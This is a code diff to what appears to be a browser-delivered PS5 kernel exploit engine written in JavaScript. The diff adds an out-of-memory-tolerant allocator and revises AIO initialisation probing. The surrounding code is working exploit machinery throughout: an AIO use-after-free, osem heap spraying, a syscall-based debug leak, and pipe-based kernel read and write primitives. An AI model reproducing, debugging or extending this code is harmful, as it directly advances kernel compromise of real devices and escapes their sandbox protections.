@@ -179,14 +179,37 @@ export function makeBagagwaEngine(X) {
         } else {
             u8 = new Uint8Array(dwords * 4);
         }
-        if (!P.nogc) P.nogc = [];
-        P.nogc.push(u8);
+        // NOTE: backing is already pinned in P.nogc by P.malloc — do NOT
+        // push the u8 view too (was doubling nogc growth -> JSC OOM
+        // right after PAIR-RELEASE/settle on tight arenas).
         return { base: ptr, u8, bytes: size, label };
+    }
+
+    // OOM-resilient alloc: P.malloc (new Uint8Array in main.js) throws
+    // "out of free memory" when the arena left by carrier release/settle
+    // is tight. Never throws — GC-and-retry once, else null so callers
+    // return a clean `why` instead of killing the page.
+    function safeAlloc(size, label) {
+        try {
+            return alloc(size, label);
+        } catch (e) {
+            try { note("[alloc] P.malloc OOM for '" + label + "' (" + size + "B): " + (e && e.message ? e.message : e)); } catch (_) {}
+            try { if (typeof globalThis.gc === "function") globalThis.gc(); } catch (_) {}
+            try {
+                const retry = alloc(size, label);
+                try { note("[alloc] retry after gc OK: '" + label + "'"); } catch (_) {}
+                return retry;
+            } catch (e2) {
+                try { note("[alloc] arena exhausted, no reclaim possible for '" + label + "'"); } catch (_) {}
+                return null;
+            }
+        }
     }
 
     async function submitAioRequest(fd, buf, size, offset) {
         const idx = S.aioRequests.length;
-        const reqBuf = alloc(0x40, "aio-req-" + idx);
+        const reqBuf = safeAlloc(0x40, "aio-req-" + idx);
+        if (!reqBuf) return { ok: false, why: "aio request buffer OOM (arena exhausted)" };
         w32(reqBuf.u8, 0x00, fd);
         w64(reqBuf.u8, 0x08, buf);
         w64(reqBuf.u8, 0x10, i64(size, 0));
@@ -200,7 +223,8 @@ export function makeBagagwaEngine(X) {
         // The original code passed (count, direct_struct_ptr) which is wrong order
         // AND passed the struct directly instead of through a pointer array.
         // Build a 1-element pointer array: ptrArr[0] = &reqBuf
-        const reqPtrBuf = alloc(8, "aio-req-ptr-" + idx);
+        const reqPtrBuf = safeAlloc(8, "aio-req-ptr-" + idx);
+        if (!reqPtrBuf) return { ok: false, why: "aio req-ptr buffer OOM (arena exhausted)" };
         w64(reqPtrBuf.u8, 0, reqBuf.base);
 
         // Try (ptr_array, count) — correct PS5 SDK convention
@@ -230,7 +254,8 @@ export function makeBagagwaEngine(X) {
             return { ok: false, why: "need " + num + " reqs, have " +
                 S.aioRequests.length };
 
-        const reqIdBuf = alloc(num * 4, "aio-wait-ids");
+        const reqIdBuf = safeAlloc(num * 4, "aio-wait-ids");
+        if (!reqIdBuf) return { ok: false, why: "multi-wait id buffer OOM (arena exhausted)" };
         for (let i = 0; i < num; i++) {
             w32(reqIdBuf.u8, i * 4, S.aioRequests[i].id);
             note("[UAF] slot " + i + " reqId=" + S.aioRequests[i].id);
@@ -256,8 +281,9 @@ export function makeBagagwaEngine(X) {
         const handles = [];
         let created = 0;
 
-        const nameBuf = alloc(32, "osem-name");
-        const attrBuf = alloc(0x20, "osem-attr");
+        const nameBuf = safeAlloc(32, "osem-name");
+        const attrBuf = safeAlloc(0x20, "osem-attr");
+        if (!nameBuf || !attrBuf) return { ok: false, count: 0, handles: [], why: "osem name/attr OOM (arena exhausted)" };
         w32(attrBuf.u8, 0x00, 1);
         w32(attrBuf.u8, 0x04, 0);
         w32(attrBuf.u8, 0x08, 1);
@@ -294,7 +320,8 @@ export function makeBagagwaEngine(X) {
             return { ok: false, why: "syscall 727 (0x2D7) stub not in firmware profile" };
         }
 
-        const outBuf = alloc(0x100, "aio-debug-leak");
+        const outBuf = safeAlloc(0x100, "aio-debug-leak");
+        if (!outBuf) return { ok: false, why: "debug-leak buffer OOM (arena exhausted)" };
         for (let i = 0; i < 0x100; i++) outBuf.u8[i] = 0;
 
         const composedId = ((tableIdx & 0x7F) << 16) | (reqId & 0xFFFF);
@@ -335,7 +362,8 @@ export function makeBagagwaEngine(X) {
 
         const req = S.aioRequests[idx];
 
-        const pipeBuf = alloc(64, "waker-pipe-data");
+        const pipeBuf = safeAlloc(64, "waker-pipe-data");
+        if (!pipeBuf) return { ok: false, why: "waker pipe buffer OOM (arena exhausted)" };
         for (let i = 0; i < 64; i++) pipeBuf.u8[i] = 0x41;
         const wr = await sys(SYS_WRITE, S.aioWfd, pipeBuf.base, 64);
 
@@ -359,7 +387,8 @@ export function makeBagagwaEngine(X) {
     }
 
     async function setupPipes() {
-        const buf = alloc(8, "pipe-fds");
+        const buf = safeAlloc(8, "pipe-fds");
+        if (!buf) return { ok: false, why: "pipe-fds buffer OOM (arena exhausted)" };
 
         w32(buf.u8, 0, 0); w32(buf.u8, 4, 0);
         let r = await sys(SYS_PIPE2, buf.base, 0);
@@ -375,7 +404,8 @@ export function makeBagagwaEngine(X) {
         S.victimWfd = r32(buf.u8, 4) | 0;
         track(S.victimRfd); track(S.victimWfd);
 
-        const seedBuf = alloc(1, "pipe-seed");
+        const seedBuf = safeAlloc(1, "pipe-seed");
+        if (!seedBuf) return { ok: false, why: "pipe-seed buffer OOM (arena exhausted)" };
         seedBuf.u8[0] = 0x41;
         await sys(SYS_WRITE, S.masterWfd, seedBuf.base, 1);
         await sys(SYS_WRITE, S.victimWfd, seedBuf.base, 1);
@@ -387,7 +417,8 @@ export function makeBagagwaEngine(X) {
 
     async function kreadFast(src, destBuf, n) {
         if (!S.masterPipeData || !S.victimPipeData) return -1;
-        const pb = alloc(PIPEBUF_SIZE, "kread-pipebuf");
+        const pb = safeAlloc(PIPEBUF_SIZE, "kread-pipebuf");
+        if (!pb) return -1;
         w32(pb.u8, 0x00, n);
         w32(pb.u8, 0x04, 0);
         w32(pb.u8, 0x08, 0);
@@ -403,7 +434,8 @@ export function makeBagagwaEngine(X) {
 
     async function kwriteFast(dest, srcBuf, n) {
         if (!S.masterPipeData || !S.victimPipeData) return -1;
-        const pb = alloc(PIPEBUF_SIZE, "kwrite-pipebuf");
+        const pb = safeAlloc(PIPEBUF_SIZE, "kwrite-pipebuf");
+        if (!pb) return -1;
         w32(pb.u8, 0x00, 0);
         w32(pb.u8, 0x04, 0);
         w32(pb.u8, 0x08, 0);
@@ -419,27 +451,31 @@ export function makeBagagwaEngine(X) {
     }
 
     async function kread64Fast(addr) {
-        const buf = alloc(8, "kr64");
+        const buf = safeAlloc(8, "kr64");
+        if (!buf) return { ret: -1, v: i64(0, 0) };
         for (let i = 0; i < 8; i++) buf.u8[i] = 0xEE;
         const ret = await kreadFast(addr, buf, 8);
         return { ret, v: r64(buf.u8, 0) };
     }
 
     async function kread32Fast(addr) {
-        const buf = alloc(4, "kr32");
+        const buf = safeAlloc(4, "kr32");
+        if (!buf) return { ret: -1, v: 0 };
         for (let i = 0; i < 4; i++) buf.u8[i] = 0xEE;
         const ret = await kreadFast(addr, buf, 4);
         return { ret, v: r32(buf.u8, 0) >>> 0 };
     }
 
     async function kwrite64Fast(addr, v) {
-        const buf = alloc(8, "kw64");
+        const buf = safeAlloc(8, "kw64");
+        if (!buf) return -1;
         w64(buf.u8, 0, v);
         return await kwriteFast(addr, buf, 8);
     }
 
     async function kwrite32Fast(addr, v) {
-        const buf = alloc(4, "kw32");
+        const buf = safeAlloc(4, "kw32");
+        if (!buf) return -1;
         w32(buf.u8, 0, v >>> 0);
         return await kwriteFast(addr, buf, 4);
     }
@@ -455,7 +491,8 @@ export function makeBagagwaEngine(X) {
             return { ok: false, why: "getpid failed: " + pidR.errText };
         const pid = pidR.s32;
 
-        const pipeBuf = alloc(8, "sigio-pipe");
+        const pipeBuf = safeAlloc(8, "sigio-pipe");
+        if (!pipeBuf) return { ok: false, why: "sigio-pipe buffer OOM (arena exhausted)" };
         w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
         const pr = await sys(SYS_PIPE2, pipeBuf.base, 0);
         if (pr.failed) return { ok: false, why: "pipe2 failed: " + pr.errText };
@@ -463,7 +500,8 @@ export function makeBagagwaEngine(X) {
         const wfd = r32(pipeBuf.u8, 4) | 0;
 
         try {
-            const ownBuf = alloc(4, "sigio-own");
+            const ownBuf = safeAlloc(4, "sigio-own");
+            if (!ownBuf) return { ok: false, why: "sigio-own buffer OOM (arena exhausted)" };
             w32(ownBuf.u8, 0, pid);
             let own = await sys(SYS_IOCTL, rfd, i64(FIOSETOWN, 0), ownBuf.base);
             if (own.failed) {
@@ -570,19 +608,41 @@ export function makeBagagwaEngine(X) {
         note("[S0-0a] Tier 1: aio_init (0x" + SYS_AIO_INIT.toString(16) + ")...");
         let aioInitBlocked = false;
         if (P.syscalls[SYS_AIO_INIT] !== undefined) {
-            const initBuf = alloc(0x10, "aio-init-params");
-            w32(initBuf.u8, 0x00, 0x10); // struct size
-            w32(initBuf.u8, 0x04, 32);   // max requests
-            w32(initBuf.u8, 0x08, 0);
-            w32(initBuf.u8, 0x0c, 0);
-            const initR = await sys(SYS_AIO_INIT, initBuf.base);
-            note("[S0-0a] aio_init ret=" + initR.s32 + " err=" + initR.errText);
-            if (!initR.failed) {
+            // ZERO-ALLOC probe first: sandbox (EPERM) / arg checks happen
+            // before the kernel touches the params pointer, so pass NULL.
+            // This is the FIRST kernel-stage alloc after carrier
+            // release/settle — P.malloc can OOM here ("out of free memory").
+            // Only build the 0x10 struct if the null call proves the
+            // syscall is reachable but wants a real pointer (EINVAL).
+            const initR0 = await sys(SYS_AIO_INIT, 0);
+            note("[S0-0a] aio_init(0) ret=" + initR0.s32 + " err=" + initR0.errText);
+            if (!initR0.failed) {
                 S.aioInited = true;
-                note("[S0-0a] AIO initialized via aio_init OK");
+                note("[S0-0a] AIO initialized via aio_init(0) — no params needed");
+            } else if (initR0.errText !== "EPERM" && initR0.errText !== "ENOSYS") {
+                note("[S0-0a] reachable, retrying once with params struct");
+                const initBuf = safeAlloc(0x10, "aio-init-params");
+                if (initBuf) {
+                    w32(initBuf.u8, 0x00, 0x10); // struct size
+                    w32(initBuf.u8, 0x04, 32);   // max requests
+                    w32(initBuf.u8, 0x08, 0);
+                    w32(initBuf.u8, 0x0c, 0);
+                    const initR = await sys(SYS_AIO_INIT, initBuf.base);
+                    note("[S0-0a] aio_init(params) ret=" + initR.s32 + " err=" + initR.errText);
+                    if (!initR.failed) {
+                        S.aioInited = true;
+                        note("[S0-0a] AIO initialized via aio_init OK");
+                    } else {
+                        aioInitBlocked = true;
+                        note("[S0-0a] aio_init blocked: " + initR.errText);
+                    }
+                } else {
+                    aioInitBlocked = true;
+                    note("[S0-0a] params alloc OOM — treating as blocked, fall through to aio_create (no alloc used)");
+                }
             } else {
                 aioInitBlocked = true;
-                note("[S0-0a] aio_init EPERM — WebKit sandbox blocks global AIO init");
+                note("[S0-0a] aio_init " + initR0.errText + " — WebKit sandbox blocks global AIO init, fall through (no alloc used)");
             }
         } else {
             note("[S0-0a] aio_init not in stub table — older FW path, skipping");
@@ -646,7 +706,8 @@ export function makeBagagwaEngine(X) {
         // ── END AIO INIT ─────────────────────────────────────────────────────────
 
         note("[S0-1] pipe (empty — reads must block)");
-        const pipeBuf = alloc(8, "uaf-pipe");
+        const pipeBuf = safeAlloc(8, "uaf-pipe");
+        if (!pipeBuf) { out.why = "uaf-pipe buffer OOM (arena exhausted)"; return out; }
         w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
         const pipeR = await sys(SYS_PIPE2, pipeBuf.base, 0);
         note("[S0-1] pipe2 ret=" + pipeR.s32 + " " + pipeR.errText);
@@ -657,7 +718,8 @@ export function makeBagagwaEngine(X) {
         out.steps.push("pipe r=" + S.aioRfd + " w=" + S.aioWfd);
 
         const num = o.numRequests || 2;
-        const dataBuf = alloc(64, "aio-data");
+        const dataBuf = safeAlloc(64, "aio-data");
+        if (!dataBuf) { out.why = "aio-data buffer OOM (arena exhausted)"; return out; }
         for (let i = 0; i < num; i++) {
             note("[S0-2." + i + "] aio_submit(req,1) fd=" + S.aioRfd);
             const sr = await submitAioRequest(S.aioRfd, dataBuf.base, 64,
@@ -715,7 +777,7 @@ export function makeBagagwaEngine(X) {
         out.steps.push("sprayed " + sr.count + " osem objects");
 
         if (!sr.ok) {
-            out.why = "osem spray failed";
+            out.why = "osem spray failed" + (sr.why ? ": " + sr.why : "");
             return out;
         }
 
